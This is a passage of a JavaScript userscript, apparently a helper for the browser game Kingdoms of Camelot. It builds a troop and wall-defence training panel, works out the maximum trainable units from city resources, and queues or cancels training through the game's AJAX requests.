      </td></tr></table></div>	  </div>      <TABLE align=center width=425 class=pdxTab><div class=pdxStat>"+culang.Hnotice+"</div><TR><TD><div id=ptTrainStatus style='overflow-y:auto; max-height:150px; height: 125px;'></div></td></tr></table>\
      <div style='width:100%; height: 330px; '>      <TABLE width=100% class=pdxTab><TR><TD height=118 colspan=2><DIV id=divSTtop></div></td></tr>\
      <TR><TD width=100% style='padding-left:15px; padding-right:15px'><DIV style='text-align:center'><DIV class=pdxStat>&nbsp;&nbsp;"+culang.Htrainque+" &nbsp; (<SPAN id=statTTtot></span>)</div><BR></div><center><img style='display:block;position:absolute;padding:0;margin:0;' id=pdxCancelAllTrain valign=absmiddle border=0 title='"+culang.canceMTsN+"' src='http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png'><DIV id=divSTleft style='width:500px;  padding:10pdx; -moz-box-shadow:inset 0px 0px 5px #000; overflow-y: auto; height:200px; max-height:300px'></div></center></td>\
      </tr><TR>        <TD width=100% style='padding-left:15px; padding-right:15px'><DIV style='text-align:center'>          <DIV class=pdxStat>"+culang.Hwallque+" (<SPAN id=statDTtot></span>)</div>          <BR>        </div>            <center>              <DIV id=divSTright style='width:470px;  padding:10pdx; -moz-box-shadow:inset 0px 0px 5px #000; overflow-y: auto; height:200px; max-height:300px'></div></center></td>\
      </tr>         </table></div></div>";
    t.cont.innerHTML = s; //<span id=ptttEstimate></span>
	
	document.getElementById ('pdxCancelAllTrain').addEventListener ('click', t.CancelAllTraining, false);
    var dcp = new CdispCityPicker ('ptspeed', document.getElementById('ptspeedcity'), true, t.clickCitySelect, 0);
    t.TTspMax = document.getElementById ('ptttSpMax');
    t.TTspMaxPS = document.getElementById ('ptttSpMaxPS');
    t.TTspMaxSlots = document.getElementById ('ptttSpMaxSlots');
    t.TTbutMaxSlots = document.getElementById ('ptttButMaxSlots');
    t.TTbutMaxPerSlot = document.getElementById ('ptttButMaxPS');
    t.TTinpPerSlot = document.getElementById ('ptttInpPS');
    t.TTinpSlots = document.getElementById ('ptttInpSlots');
    t.TTselType = document.getElementById ('ptttType');
    t.TTbutDo = document.getElementById ('ptttButDo');
	t.TTlimiter = document.getElementById ('ptttLimiter');
    t.TDspMax = document.getElementById ('pttdSpMax');
    t.TDspMaxPS = document.getElementById ('pttdSpMaxPS');
    t.TDspMaxSlots = document.getElementById ('pttdSpMaxSlots');
    t.TDbutMaxSlots = document.getElementById ('pttdButMaxSlots');
    t.TDbutMaxPerSlot = document.getElementById ('pttdButMaxPS');
    t.TDinpPerSlot = document.getElementById ('pttdInpPS');
    t.TDinpSlots = document.getElementById ('pttdInpSlots');
    t.TDselType = document.getElementById ('pttdType');
    t.TDbutDo = document.getElementById ('pttdButDo');
    t.TDspSpace = document.getElementById ('pttdSpace');
	t.TDlimiter = document.getElementById ('pttdLimiter');
    t.divTrainStatus = document.getElementById ('ptTrainStatus');   
    t.TTinpSlots.addEventListener ('change', t.updateTopTroops, false);
    t.TTbutMaxPerSlot.addEventListener ('click', t.clickTroopMaxPS, false);
    t.TTbutMaxSlots.addEventListener ('click', t.clickTroopMaxSlots, false);
    t.TTselType.addEventListener ('change', t.changeTroopSelect, false);
    t.TTbutDo.addEventListener ('click', t.clickTroopDo, false);
    t.TDinpSlots.addEventListener ('change', t.updateTopDef, false);
    t.TDselType.addEventListener ('change', t.changeDefSelect, false);
    t.TDbutMaxPerSlot.addEventListener ('click', t.clickDefMaxPS, false);
    t.TDbutMaxSlots.addEventListener ('click', t.clickDefMaxSlots, false);
    t.TDbutDo.addEventListener ('click', t.clickDefDo, false);
	document.getElementById ('chkPop').addEventListener ('change', t.clickCheckIdlePop, false);
    document.getElementById ('chkDoTraps').addEventListener ('change', t.clickCheckDoTraps, false);
    document.getElementById ('chkDoCaltrops').addEventListener ('change', t.clickCheckDoCaltrops, false);
    document.getElementById ('chkDoSpikes').addEventListener ('change', t.clickCheckDoSpikes, false);
    document.getElementById ('chkDoXbows').addEventListener ('change', t.clickCheckDoXbows, false);
	document.getElementById ('pttrgamble').addEventListener ('change', t.changeTroopSelect, false);
    t.changeTroopSelect();
    t.changeDefSelect();
	t.doWallTrain(1);
  },

  togOpt : function (checkboxId, optionName, callOnChange, callEnable,callIsAvailable){
    var t = Tabs.Train;
    var checkbox = document.getElementById(checkboxId);

    if (callIsAvailable && callIsAvailable()==false){
      checkbox.disabled = true;
      return;
    }
    if (Options[optionName])
      checkbox.checked = true;
    checkbox.addEventListener ('change', eventHandler, false);
    function eventHandler (){
      Options[optionName] = this.checked;

      saveOptions();
      if (callOnChange)
        callOnChange (this.checked);
		if (optionName=="DeleteMsg" || optionName=="DeleteMsgs0" || optionName=="DeleteMsgs1" || optionName=="DeleteMsgs2" || optionName=="DeleteMsgs3") {
		DeleteReports.init();
 } 
    }
  },
  hide : function (){
    var t = Tabs.Train;
    clearTimeout (t.timer);
	 mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = ""+Colors.TabWidth+"" + 'px';
  },
  
  show : function (){
    var t = Tabs.Train;
    clearTimeout (t.timer);
    t.displayCityStats();
    t.changeTroopSelect();
    t.changeDefSelect();
    t.timer = setTimeout (t.show, 2000);
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = ""+Colors.TabWidth+"" + 'px';
  },

/*******  TROOPS  ******/  
  updateTopTroops : function (){
    var t = Tabs.Train;
    var slots = parseInt(t.TTinpSlots.value, 10);
    if (isNaN(slots) || slots<0)
      slots = 0;
    t.TTspMax.innerHTML = t.stats.MaxTrain;
    t.TTlimiter.innerHTML = t.stats.Limiter;
    t.TTspMaxSlots.innerHTML = t.stats.barracks - t.stats.queued;
    if (slots<1 || (t.stats.barracks-t.stats.queued < 1))
      t.TTspMaxPS.innerHTML = 0;
    else
      t.TTspMaxPS.innerHTML = parseInt(t.stats.MaxTrain / slots);
  },
  clickTroopMaxPS : function (){
    var t = Tabs.Train;
    var slots = parseInt(t.TTinpSlots.value, 10);
    if (slots<1 || (t.stats.barracks-t.stats.queued < 1))
      t.TTinpPerSlot.value = 0;
    else
      t.TTinpPerSlot.value = parseInt(t.stats.MaxTrain / slots);
  },
  clickTroopMaxSlots : function (){
    var t = Tabs.Train;
    t.TTinpSlots.value = t.stats.barracks - t.stats.queued;
  },
  clickCitySelect : function (city){
    var t = Tabs.Train;
    t.selectedCity = city;
    t.lastQueString = null;   
    t.lastDQueString = null;   
    t.displayCityStats ();
    t.changeTroopSelect();
    t.changeDefSelect();
    t.JumpCity(city.name);
  },
  JumpCity:function(city) {
     		var t = Tabs.Train;
     		for (i=0;i<Seed.cities.length;i++) {
     			if (Seed.cities[i][1]==city) var cityNum=i;
     		}
     		cityNum++;
     		var obj = document.getElementById('citysel_'+cityNum);
  	   	return t.ClickWin(window,obj,'click');
     },
  ClickWin:function(win,obj,evtName) {
     	var evt = win.document.createEvent("MouseEvents");
     	evt.initMouseEvent(evtName, true, true, win,
     		0, 0, 0, 0, 0, false, false, false, false, 0, null);
     	return !obj.dispatchEvent(evt);
     },
  clickCheckIdlePop : function (){
    var t = Tabs.Train;
    if (document.getElementById ('chkPop').checked)
      Options.maxIdlePop = true;
    else
      Options.maxIdlePop = false;
    saveOptions ();
    t.displayCityStats ();
    t.changeTroopSelect ();
  },
  	clickCheckDoTraps: function (){
		var t = Tabs.Train;
		var cityNo = Cities.byID[t.selectedCity.id].idx + 1;
		WallTrainOptions.doTraps[cityNo] = (document.getElementById ('chkDoTraps').checked)
		saveWallTrainOptions ();
		t.displayCityStats ();
		t.changeDefSelect ();
	},
  	clickCheckDoCaltrops: function (){
		var t = Tabs.Train;
		var cityNo = Cities.byID[t.selectedCity.id].idx + 1;
		WallTrainOptions.doCalrops[cityNo] = (document.getElementById ('chkDoCaltrops').checked)
		saveWallTrainOptions ();
		t.displayCityStats ();
		t.changeDefSelect ();
	},
  	clickCheckDoSpikes: function (){
		var t = Tabs.Train;
		var cityNo = Cities.byID[t.selectedCity.id].idx + 1;
		WallTrainOptions.doSpikes[cityNo] = (document.getElementById ('chkDoSpikes').checked)
		saveWallTrainOptions ();
		t.displayCityStats ();
		t.changeDefSelect ();
	},
  	clickCheckDoXbows: function (){
		var t = Tabs.Train;
		var cityNo = Cities.byID[t.selectedCity.id].idx + 1;
		WallTrainOptions.doXbows[cityNo] = (document.getElementById ('chkDoXbows').checked)
		saveWallTrainOptions ();
		t.displayCityStats ();
		t.changeDefSelect ();
	},

  limitingFactor : null,
    
  changeTroopSelect : function (){
    var t = Tabs.Train;
    var cityId = t.selectedCity.id; // unitcost: NAME, Food, Wood, Stone, Ore, Gold, Pop, ?
    var id = t.TTselType.value;
    t.lastTroopSelect = id;
  	  var uc = unsafeWindow.unitcost['unt'+id];	
		var actualuc = [];
	for(var r = 1; r<5; r++){
 			if(document.getElementById('pttrgamble').value > 0)
 				actualuc[r] = uc[r] * t.gamble[document.getElementById('pttrgamble').value].cost;
 			else
 				actualuc[r] = uc[r];
 		}

    var max = 9999999999;
    var limitingFactor2 = 'Unknown';
	t.limitingFactor = null;
    if ( (t.stats.food / actualuc[1]) < max) {
      max = t.stats.food / actualuc[1];
      limitingFactor2 = culang.food;
	  t.limitingFactor = 'food';
    }
    if ( (t.stats.wood / actualuc[2]) < max) {
      max = t.stats.wood / actualuc[2];
      limitingFactor2 = culang.wood;
	  t.limitingFactor = 'wood';
    }
    if ( (t.stats.stone / actualuc[3]) < max) {
      max = t.stats.stone / actualuc[3];
      limitingFactor2 = culang.stone;
	  t.limitingFactor = 'stone';
    }
    if ( (t.stats.ore / actualuc[4]) < max) {
      max = t.stats.ore / actualuc[4];
      limitingFactor2 = culang.ore;
	  t.limitingFactor = 'ore';
    }
    if ( (t.stats.idlePop / uc[6]) < max) {
      max = t.stats.idlePop / uc[6];
      limitingFactor2 = culang.pop;
	  t.limitingFactor = 'pop';
    }
    t.stats.MaxTrain = parseInt (max);
    t.stats.Limiter = limitingFactor2;
    if (t.stats.MaxTrain < 0)
      t.stats.MaxTrain = 0;
    if (matTypeof(uc[8]) == 'object'){
      for (k in uc[8]){  // check building requirement
        var b = getCityBuilding (cityId, k.substr(1));
        if (b.maxLevel < uc[8][k][1]){
          t.stats.MaxTrain = 0;
          t.stats.Limiter = ''+culang.LTresearchbuild+'';
          t.limitingFactor = null;
          break;
        }
      }
    }
    if (matTypeof(uc[9]) == 'object'){
      for (k in uc[9]){    // check tech requirement
        if (parseInt(Seed.tech['tch'+k.substr(1)]) < uc[9][k][1]){
          t.stats.MaxTrain = 0;
          t.limitingFactor = null;
          t.stats.Limiter = ''+culang.research+'';
          break;
        }
      }
    }
if (t.limitingFactor){
  document.getElementById('ptttr_'+ t.limitingFactor).className = 'boldRed';
}    
    t.updateTopTroops();
  },

 CancelAllTraining : function() {
   var t = Tabs.Train;
 
   var cityId = t.selectedCity.id;
   var q = Seed.queue_unt['city'+cityId];
   if (q.length>0) {
   
    var b=prompt(""+culang.canceMT+" "+(q.length)+")", 2);
    if (parseInt(b)<=q.length && parseInt(b)>0) {
     t.dispTrainStatus ('<font color=#550000><B>'+culang.canceMTs+'</b></font><BR>');
     document.getElementById ('pdxCancelAllTrain').style.display='none';
     t.CancelActionall(q.length-1, b-1);
    }
   
   }
   
  },
  CancelActionall: function(num, fintraitement) {
   var t = Tabs.Train;
   var cityId = t.selectedCity.id;
   var q = Seed.queue_unt['city'+cityId];
   var now = unixTime();
   start = q[num][2];
   end = q[num][3];
   if (first)
       actual = end - now;
   else
       actual = end - lastEnd;
   if (actual < 0)
       actual = 0;     
   var param2=cityId; // id de la ville
   var param3=q[num][0]; // Type de trouoe
   var param4=q[num][1]; // Qte troupe
   var param5=end; // debut
   var param6=start; // fin
   var param7=actual; // duree
      
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.cityId = param2;
        params.requestType ="CANCEL_TRAINING";
        params.numtrptrn = param4;
        params.trnETA= param5;
        params.trnNeeded = param7;
        params.trnTmp = param6;
        params.typetrn= param3;
    
     new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/cancelTraining.php" + unsafeWindow.g_ajaxsuffix, {
             method: "post",
             parameters: params,
           onSuccess: function (rslt) {
            var t = Tabs.Train;
            if (rslt.ok) {
               unsafeWindow.update_seed_ajax(true,function(){
   	       var k=0;for(var j=0;j<unsafeWindow.seed.queue_unt["city"+param2].length;j++){
   	        if(j>num){
   	         unsafeWindow.seed.queue_unt["city"+param2][j][2]=parseInt(rslt.dateTraining[k]["start"]);
   	         unsafeWindow.seed.queue_unt["city"+param2][j][3]=parseInt(rslt.dateTraining[k]["end"]);
   	         k++;
   	         }
   	        }
   	        unsafeWindow.seed.queue_unt["city"+param2].splice(num,1);
   	        for(var i=1;i<5;i++){
   	         var totalReturn=parseInt(unsafeWindow.unitcost["unt"+param3][i])*parseInt(param4)*3600/2;
   	         unsafeWindow.seed.resources["city"+param2]["rec"+i][0]=parseInt(unsafeWindow.seed.resources["city"+param2]["rec"+i][0])+totalReturn;
   	        }
       	       });

	        var numnew = num - 1;
	        if (numnew<fintraitement) {
	         t.dispTrainStatus ('<font color=#550000><B>'+culang.canceltrain+'</b></font><BR>');
                 document.getElementById ('pdxCancelAllTrain').style.display='block';
	         t.displayCityStats();
	        } else {
	          setTimeout(function (){
	            t.CancelActionall(numnew, fintraitement);
		  }, (Math.random()*1000)+1000 );
                }
             
            } else {
             t.dispTrainStatus ("<font color=#550000><B>"+culang.Herror+": "+culang.deltrainNote+"</b></font><BR>");
             t.displayCityStats();
             document.getElementById ('pdxCancelAllTrain').style.display='block';
            }
           },
           onFailure: function (rslt) {
            var t = Tabs.Train;
            t.dispTrainStatus ("<font color=#550000><B>"+culang.Herror+": "+culang.deltrainNote+"</b></font><BR>");
            t.displayCityStats();
            document.getElementById ('pdxCancelAllTrain').style.display='block';
           }
    });
},
  clickTroopDo : function (){
    var t = Tabs.Train;
    var cityId = t.selectedCity.id;
	unsafeWindow.citysel_click(document.getElementById('citysel_'+ (t.selectedCity.idx+1)+''));
    var unitId = t.TTselType.value;
    var perSlot = parseInt(t.TTinpPerSlot.value, 10);
    var numSlots = parseInt(t.TTinpSlots.value, 10);
    
    t.displayCityStats ();
    if (t.running){
      t.stopTraining('<SPAN class=boldRed>'+culang.traincanceled+'</span>');
      return; 
    }    
    if (perSlot<1){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>'+culang.trainnote+'</font>';
      return;
    }
    if (perSlot*numSlots > t.stats.MaxTrain){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>'+culang.canttrain+' <blink>'+ t.stats.MaxTrain +' </blink> '+culang.canttrain2+'</font>';
      return;
    }
    if (numSlots<1 || numSlots>t.stats.barracks - t.stats.queued){
      t.divTrainStatus.innerHTML = '<b><FONT COLOR=#550000><blink>'+culang.trainnoteErr+'</blink></font></b>';
      return;
    }
	if (document.getElementById ('chkTut').checked)
		var tut = document.getElementById ('tutelage').value;
	else
		var tut = 0;
		
		var gamble = document.getElementById ('pttrgamble').value;
    t.TDbutDo.disabled = true;
    t.TTbutDo.className = 'ptButCancel';
    t.TTbutDo.value = ''+culang.Hcancel+'';
    var que = [];
    for (var i=0; i<numSlots; i++)
      que.push (['T', unitId, parseInt (perSlot)]);
    t.divTrainStatus.innerHTML = '';
    t.running = true;
    t.doQueue (cityId, tut, gamble, que);
  },
/*******  DEF  ******/  
  updateTopDef : function (){
    var t = Tabs.Train;
    var slots = parseInt(t.TDinpSlots.value, 10);
    if (isNaN(slots) || slots<0)
      slots = 0;
    t.TDspMax.innerHTML = ''+culang.max+'. '+ t.stats.MaxDefTrain +'&nbsp; '+culang.owned+': '+ t.stats.defOwned;   
    t.TDlimiter.innerHTML = t.stats.DefLimiter;
    t.TDspMaxSlots.innerHTML = t.stats.wallLevel-t.stats.Dqueued;
    if (slots<1)
      t.TDspMaxPS.innerHTML = 0;
    else
      t.TDspMaxPS.innerHTML = parseInt(t.stats.MaxDefTrain / slots);

    t.TDspSpace.innerHTML = ''+culang.wall+' '+culang.level+': <B>'+ t.stats.wallLevel +'</b><BR>'+culang.walldefense+': '+ (t.stats.wallSpaceUsed+t.stats.wallSpaceQueued)  +'/<B>'+ t.stats.wallSpace +'</b><BR>\
        '+culang.fielddefense+': '+ (t.stats.fieldSpaceUsed+t.stats.fieldSpaceQueued) +'/<B>'+ t.stats.fieldSpace +'</b>';
  },
  changeDefSelect : function (){
    var t = Tabs.Train;
    var cityId = t.selectedCity.id; // unitcost: NAME, Food, Wood, Stone, Ore, Gold, Pop, ?
    var id = t.TDselType.value;
    t.lastDefSelect = id;
    t.stats.defOwned = parseInt(Seed.fortifications['city' + cityId]['fort'+id]);    
    var uc = unsafeWindow.fortcost['frt'+id];
    var max = 9999999999;
    if ( (t.stats.food / uc[1]) < max)
      max = t.stats.food / uc[1];
      limitingFactor2 = culang.food;
    if ( (t.stats.wood / uc[2]) < max)
      max = t.stats.wood / uc[2];
      limitingFactor2 = culang.wood;
    if ( (t.stats.stone / uc[3]) < max)
      max = t.stats.stone / uc[3];
      limitingFactor2 = culang.stone;
    if ( (t.stats.ore / uc[4]) < max)
      max = t.stats.ore / uc[4];
      limitingFactor2 = culang.ore;
    if ( (t.stats.idlePop / uc[6]) < max)
      max = t.stats.idlePop / uc[6];
      limitingFactor2 = culang.pop;
    t.stats.MaxDefTrain = parseIntNan (max);
    if (t.stats.MaxDefTrain < 0)
      t.stats.MaxDefTrain = 0;
    if (matTypeof(uc[8]) == 'object'){
      for (k in uc[8]){  // check building requirement
        var b = getCityBuilding (cityId, k.substr(1));
        if (b.maxLevel < uc[8][k][1]){
          t.stats.MaxDefTrain = 0;
          t.stats.DefLimiter = culang.ATlimiterBU;
          break;
        }
      }
    }
    if (matTypeof(uc[9]) == 'object'){
      for (k in uc[9]){    // check tech requirement
        if (parseInt(Seed.tech['tch'+k.substr(1)]) < uc[9][k][1]){
          t.stats.MaxDefTrain = 0;
          t.stats.DefLimiter = culang.research;
          break;
        }
      }
    }
    var spaceEach = parseInt(unsafeWindow.fortstats["unt"+ id][5]);
    if (id<60)
      var spaceAvail = t.stats.wallSpace - t.stats.wallSpaceUsed - t.stats.wallSpaceQueued;
    else
      var spaceAvail = t.stats.fieldSpace - t.stats.fieldSpaceUsed - t.stats.fieldSpaceQueued;
    if ( t.stats.MaxDefTrain * spaceEach > spaceAvail)
      t.stats.MaxDefTrain = parseInt(spaceAvail / spaceEach);
      if (id<60)
        t.stats.DefLimiter = culang.walldefense;
      else
        t.stats.DefLimiter = culang.fielddefense;

    t.updateTopDef();
  },
  clickDefMaxPS : function (){
    var t = Tabs.Train;
    var slots = parseInt(t.TDinpSlots.value, 10);
    if (slots<1)
      t.TDinpPerSlot.value = 0;
    else
      t.TDinpPerSlot.value = parseInt(t.stats.MaxDefTrain / slots);
  },

  clickDefMaxSlots : function (){
    var t = Tabs.Train;
    t.TDinpSlots.value = t.stats.wallLevel-t.stats.Dqueued;
  },
    
  clickDefDo : function (){
    var t = Tabs.Train;
    var cityId = t.selectedCity.id;
    var unitId = t.TDselType.value;
    var perSlot = parseInt(t.TDinpPerSlot.value, 10);
    var numSlots = parseInt(t.TDinpSlots.value, 10);
    
    t.displayCityStats ();
    if (t.running){
      t.stopTraining('<SPAN class=boldRed>'+culang.cancelwallq+'</span>');
      return; 
    }    
    if (perSlot<1){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>'+culang.trainnote+'</font>';
      return;
    }
    if (perSlot*numSlots > t.stats.MaxDefTrain){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>'+culang.cantbuild+' '+ t.stats.MaxDefTrain +' '+culang.cantbuild2+'</font>';
      return;
    }
    if (numSlots<1 || numSlots > t.stats.wallLevel-t.stats.Dqueued){
      t.divTrainStatus.innerHTML = '<b><FONT COLOR=#550000>'+culang.trainnoteErr+'</font></b>';
      return;
    }
    var siege = document.getElementById ('siege').value;
    t.TTbutDo.disabled = true;
    t.TDbutDo.className = 'ptButCancel';
    t.TDbutDo.value = ''+culang.Hcancel+'';
    var que = [];
    for (var i=0; i<numSlots; i++)
      que.push (['T', unitId, parseInt (perSlot)]);
    t.divTrainStatus.innerHTML = '';
    t.running = true;
    t.doDefQueue (cityId, que);
  },
doDefQueue : function (cityId, que, errMsg){
    var t = Tabs.Train;
    clearTimeout (t.trainTimer);
    try {
      t.displayCityStats();
      if (errMsg){
        t.stopTraining ('<SPAN class=boldRed>'+culang.Herror+': '+ errMsg +'</span>');
        return;
      }
      var cmd = que.shift();
      if (!cmd){
        t.stopTraining ('<B>'+culang.builddone+'</b>');
        return;
      }
      if (cmd[0] == 'T'){
        t.dispTrainStatus (''+culang.TTbuildque+' <span class=boldRed>'+ cmd[2] +'</span> '+  fortNamesShort[cmd[1]] +' '+culang.at+' '+ Cities.byID[cityId].name +' '+culang.off+'('+culang.TTleftslots+': '+ que.length +')<BR>');
        doDefTrain ( cityId, cmd[1], cmd[2], 
          function(errMsg){
            t.trainTimer = setTimeout(function (){Tabs.Train.doDefQueue(cityId, que, errMsg);}, (Math.random()*3500)+1500);
          } );
      }
    } catch (err) {
      logit (inspect (err, 8, 1));
      t.stopTraining ('<SPAN class=boldRed>PROGRAMM '+culang.Herror+': '+ err.message +'</span>');
    }
  },
  fixQueTimes : function (q){
    var now = unixTime();
    if (q[0][2] > now)
      q[0][2] = now;
    for (var i=0; i<q.length; i++){
      if (q[i+1]!=null && q[i+1][2]!=q[i][3])
        q[i][3] = q[i+1][2];
    }        
  },
  expireTheQueue : function (q){
    if (q==null)
      return;
    var now = unixTime();
    while (q.length>0 && (q[0][3] - now) < 1)
      q.shift();
  },
 displayCityStats : function (){
    var t = Tabs.Train;
    var cityId = t.selectedCity.id;
	var cityNo = Cities.byID[t.selectedCity.id].idx + 1;
	if (t.prevCityNo != cityNo) {
	t.prevCityNo = cityNo;
	document.getElementById ('chkDoTraps').checked = WallTrainOptions.doTraps[cityNo];
	document.getElementById ('chkDoCaltrops').checked = WallTrainOptions.doCalrops[cityNo];
	document.getElementById ('chkDoSpikes').checked = WallTrainOptions.doSpikes[cityNo];
	document.getElementById ('chkDoXbows').checked = WallTrainOptions.doXbows[cityNo];
		}
    t.stats.food = parseInt (Seed.resources['city'+cityId].rec1[0]/3600);
    t.stats.wood = parseInt (Seed.resources['city'+cityId].rec2[0]/3600);
    t.stats.stone = parseInt (Seed.resources['city'+cityId].rec3[0]/3600);
    t.stats.ore = parseInt (Seed.resources['city'+cityId].rec4[0]/3600);
    t.stats.gold = Seed.citystats['city'+cityId].gold[0];
    if (Options.maxIdlePop)
      t.stats.idlePop = parseInt(Seed.citystats['city'+cityId].pop[0]);
    else
      t.stats.idlePop = parseInt(Seed.citystats['city'+cityId].pop[0]) - parseInt(Seed.citystats['city'+cityId].pop[3]);
    t.stats.barracks = getCityBuilding (cityId, 13).count;
    var m = '<DIV class=pdxStat >'+culang.Htroopsin+' '+ Cities.byID[cityId].name +' &nbsp; ('+ Cities.byID[cityId].x +','+ Cities.byID[cityId].y +')</div>';
		
	m += '<div class=pdxTrainTrpRes><TABLE align=center width=90% border="0"  cellpadding="0" cellspacing="0" class=pdxTab><TR align=left>			<TD width=2%><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_1_50_s34.jpg" width="23" height="23"></td>			<TD width=12%><div align="left"><B>'+culang.supplytroop+':</b></div></td>			<TD width=22%><div align="left">'+addCommas(Seed.units['city'+cityId]['unt1'])+'</div></td>			<TD width=2%><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_7_50_s34.jpg" width="23" height="23"></td>			<TD width=12%><div align="left"><B>'+culang.cavalry+':</b></div></td><TD width=24%><div align="left">'+addCommas(Seed.units['city'+cityId]['unt7'])+'</div></td>			<TD width=12%><div align="right"><img src="http://koc.god-like.info/img/food_30.png" width="30" height="30"></div></td>			<TD width=12%><div align="left"><SPAN id=ptttr_food><B>'+culang.food+':</b></SPAN></div></td>			<TD width=12%><div align="left">'+ addCommasInt(t.stats.food) +'</div></td><TR align=left>			<TD width=2%><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_2_50_s34.jpg" width="23" height="23"></td>			<TD width=12%><div align="left"><B>'+culang.militiaman+':</b></div></td>			<TD width=22%><div align="left">'+addCommas(Seed.units['city'+cityId]['unt2'])+'</div>			<TD width=2%><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_8_50_s34.jpg" width="23" height="23"></td>			<TD width=12%><div align="left"><B>'+culang.heavycavalry+':</b></div></td><TD width=24%><div align="left">'+addCommas(Seed.units['city'+cityId]['unt8'])+'</div>			<TD width=12%><div align="right"><img src="http://koc.god-like.info/img/wood_30.png" width="30" height="30"></div></td>			<TD width=12%><div align="left"><SPAN id=ptttr_wood><B>'+culang.wood+':</b></SPAN></div></td>			<TD width=12%><div align="left">'+ addCommasInt(t.stats.wood) +'</div></td><TR align=left>			<TD><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_3_50_s34.jpg" width="23" height="23"></td>			<TD><div align="left"><B>'+culang.scout+':</b></div></td>			<TD><div align="left">'+addCommas(Seed.units['city'+cityId]['unt3'])+'</div>			<TD><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_9_50_s34.jpg" width="23" height="23"></td>			<TD><div align="left"><B>'+culang.supplywagon+':</b></div></td><TD><div align="left">'+addCommas(Seed.units['city'+cityId]['unt9'])+'</div>			<TD><div align="right"><img src="http://koc.god-like.info/img/iron_30.png" width="30" height="30"></div></td>			<TD><div align="left"><SPAN id=ptttr_ore><B>'+culang.ore+':</b></SPAN></div></td>			<TD><div align="left">'+ addCommasInt(t.stats.ore) +'</div></td><TR align=left>			<TD><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_4_50_s34.jpg" width="23" height="23"></td>			<TD><div align="left"><B>'+culang.pikeman+':</b></div></td>			<TD><div align="left">'+addCommas(Seed.units['city'+cityId]['unt4'])+ '</div>			<TD><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_10_50_s34.jpg" width="23" height="23"></td>			<TD><div align="left"><B>'+culang.ballista+':</b></div></td><TD><div align="left">'+addCommas(Seed.units['city'+cityId]['unt10'])+ '</div>			<TD><div align="right"><img src="http://koc.god-like.info/img/stone_30.png" width="30" height="30"></div></td>			<TD><div align="left"><SPAN id=ptttr_stone><B>'+culang.stone+':</b></SPAN></div></td>			<TD><div align="left">'+ addCommasInt(t.stats.stone) +'</div></td><TR align=left>			<TD><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_5_50_s34.jpg" width="23" height="23"></td>			<TD><div align="left"><B>'+culang.swordsman+':</b></div></td>			<TD><div align="left">'+addCommas(Seed.units['city'+cityId]['unt5'])+'</div>			<TD><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_11_50_s34.jpg" width="23" height="23"></td>			<TD><div align="left"><B>'+culang.batteringram+':</b></div></td><TD><div align="left">'+addCommas(Seed.units['city'+cityId]['unt11'])+'</div>			<TD><div align="right"><img src="http://koc.god-like.info/img/gold_30.png" width="30" height="30"></div></td>			<TD><div align="left"><SPAN id=ptttr_gold><B>'+culang.gold+':</b></SPAN></div></td>			<TD><div align="left">'+ addCommasInt(t.stats.gold) +'</div></td><TR align=left><TD><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_6_50_s34.jpg" width="23" height="23"></td>			<TD><div align="left"><B>'+culang.archer+':</b></div></td><TD><div align="left">'+addCommas(Seed.units['city'+cityId]['unt6'])+' </div>			<TD><img src="http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_12_50_s34.jpg" width="23" height="23"></td>			<TD><div align="left"><B>'+culang.catapult+':</b></div></td><TD><div align="left">'+addCommas(Seed.units['city'+cityId]['unt12'])+'</div>			<TD><div align="right"><img src="http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/population_30.png" width="30" height="30"></div></td>			<TD><div align="left"><SPAN id=ptttr_pop><B>'+culang.idlepop+':</b></SPAN></div></td><TD><div align="left">'+ addCommasInt(t.stats.idlePop) +'</div></td></table></div>';
		document.getElementById ('divSTtop').innerHTML = m;
 
// troop queue .... 
    var totTime = 0;
    var q = Seed.queue_unt['city'+cityId];
	var c = Cities.byID[cityId].idx;
    t.expireTheQueue(q);
    var qs = q.toString();
    var now = unixTime();
    if (q!=null && q.length>0)
      totTime = q[q.length-1][3] - now;
    if ( qs == t.lastQueString){
      if (q!=null && q.length>0){
        var cur = q[0][3] - now;
        document.getElementById ('ptttfq').innerHTML = timestr(cur, true);
      }
    } else {
      t.lastQueString = qs;
      t.stats.queued = 0;
      m = '<TABLE align=center class=pdxTab>';
      if (q!=null && q.length>0 ){
        t.fixQueTimes (q);
        t.stats.queued = q.length;
        first = true;
        for (var i=0; i<q.length; i++){
          start = q[i][2];
          end = q[i][3];
          if (first)
            actual = end - now;
          else
            actual = end - lastEnd;
          if (actual < 0)
            actual = 0;
          q[i][6] = cityId;
         m += '<TR align=right><TD width="5px"><A><DIV onclick="cancelTrain('+ q[i][0]+','+q[i][1]+','+q[i][2]+','+q[i][3]+','+q[i][5]+','+q[i][6]+','+i +');return false;" href="javascript:void(0);"><img src="http://cdn1.iconfinder.com/data/icons/musthave/16/Remove.png" border=0 title="'+culang.cancelTR+'"></div></a></td>';
		 m += '<TD>'+ q[i][1] +' </td><TD align=left> '+ unsafeWindow.unitcost['unt'+q[i][0]][0];
          if (first)
